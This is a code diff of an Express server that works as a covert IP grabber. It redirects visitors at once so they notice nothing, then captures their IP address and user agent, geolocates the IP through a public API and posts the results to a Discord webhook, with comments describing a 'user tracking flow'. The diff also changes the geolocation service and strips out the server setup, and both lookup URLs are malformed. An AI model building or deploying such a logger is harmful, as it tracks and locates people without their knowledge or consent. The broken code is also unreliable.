@@ -1,42 +1,15 @@
-const express = require('express'); 
-const app = express(); 
-
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK; 
-const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
-
-app.get('/', async (req, res) => { 
-    // 1. Instantly redirect the user right away so they don't see any fetch errors
-    res.redirect(302, REDIRECT_URL);
-
-    // 2. Safely capture data in the background (Non-blocking execution)
-    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''; 
-    let clientIp = rawIp.replace(/,.*$/, '').trim(); 
-
-    if (clientIp.includes('::ffff:')) { 
-        clientIp = clientIp.replace('::ffff:', ''); 
-    } 
-
-    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') { 
-        clientIp = '8.8.8.8'; 
-    } 
-
-    const userAgent = req.headers['user-agent'] || 'Unknown'; 
-
     if (DISCORD_WEBHOOK_URL) {
-        // Wrap EVERYTHING in a standalone background process try-catch
+        // Safe, non-blocking background task
         try { 
-            // Query ip-api explicitly using its IPv4-only fallback endpoint to prevent Node network fetch failures
-            const geoResponse = await fetch(`http://ip-api.com{clientIp}`); 
-            
-            if (!geoResponse.ok) {
-                throw new Error(`API responded with status: ${geoResponse.status}`);
-            }
-
+            // Switched to ipwho.is: Fast, open, supports secure HTTPS, and cloud-friendly
+            const geoResponse = await fetch(`https://ipwho.is{clientIp}`); 
             const geoData = await geoResponse.json(); 
 
-            const ispName = geoData.isp || "Unknown"; 
-            const cityName = geoData.city || "Unknown"; 
-            const countryName = geoData.country || "Unknown"; 
+            // Map data layout from ipwho.is response
+            // If the IP is invalid or local, it responds with success: false safely
+            const ispName = geoData.connection?.isp || "Unknown ISP"; 
+            const cityName = geoData.city || "Unknown City"; 
+            const countryName = geoData.country || "Unknown Country"; 
 
             const discordPayload = { 
                 embeds: [{ 
@@ -54,19 +27,14 @@ app.get('/', async (req, res) => {
                 }] 
             }; 
 
+            // Send the payload to Discord
             await fetch(DISCORD_WEBHOOK_URL, { 
                 method: 'POST', 
                 headers: { 'Content-Type': 'application/json' }, 
                 body: JSON.stringify(discordPayload) 
             }); 
         } catch (error) { 
-            // Background log logging so it doesn't interrupt user tracking flow
-            console.error("Background Logger Failed gracefully:", error.message); 
+            // Logs the explicit error stack trace to your console if it ever drops
+            console.error("Background Logger Failed gracefully:", error); 
         } 
     } 
-}); 
-
-const PORT = process.env.PORT || 10000; 
-app.listen(PORT, () => { 
-    console.log(`Server running on port ${PORT}`); 
-});
